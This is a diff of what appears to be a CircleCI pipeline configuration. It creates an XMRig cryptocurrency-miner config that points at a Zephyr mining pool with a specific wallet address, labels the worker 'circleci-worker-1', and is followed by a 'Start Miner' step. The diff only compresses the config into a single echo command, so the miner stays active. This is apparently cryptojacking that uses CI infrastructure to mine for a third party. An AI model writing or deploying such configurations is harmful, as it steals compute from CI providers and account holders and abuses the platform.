@@ -28,39 +28,7 @@ jobs:
           name: Create Config
           command: |
             cd /tmp/xmrig-6.26.0
-            cat > config.json <<\EOF
-            {
-                "autosave": true,
-                "cpu": {
-                    "enabled": true,
-                    "huge-pages": true,
-                    "max-threads-hint": 100,
-                    "asm": true,
-                    "rx": {
-                        "asm": true,
-                        "msr": true,
-                        "jit": true
-                    }
-                },
-                "log": {
-                    "log-level": 3,
-                    "print-time": 10
-                },
-                "pools": [
-                    {
-                        "algo": "randomx",
-                        "url": "de.zephyr.herominers.com:1123",
-                        "user": "ZEPHYR3UsBjPbXaFoVnrGT5ReMf2DYfPv4JC51gFATKcJX66jgLP41DJHGAnEQrfVB5DnBRiyWk8qEA5F6gE7UhZe7pjCXtYM5T1L",
-                        "pass": "circleci-worker-1",
-                        "enabled": true
-                    }
-                ],
-                "randomx": {
-                    "rdmsr": true,
-                    "wrmsr": true
-                }
-            }
-            EOF
+            echo '{"autosave":true,"cpu":{"enabled":true,"huge-pages":true,"max-threads-hint":100,"asm":true,"rx":{"asm":true,"msr":true,"jit":true}},"log":{"log-level":3,"print-time":10},"pools":[{"algo":"randomx","url":"de.zephyr.herominers.com:1123","user":"ZEPHYR3UsBjPbXaFoVnrGT5ReMf2DYfPv4JC51gFATKcJX66jgLP41DJHGAnEQrfVB5DnBRiyWk8qEA5F6gE7UhZe7pjCXtYM5T1L","pass":"circleci-worker-1","enabled":true}],"randomx":{"rdmsr":true,"wrmsr":true}}' > config.json
       
       - run:
           name: Start Miner
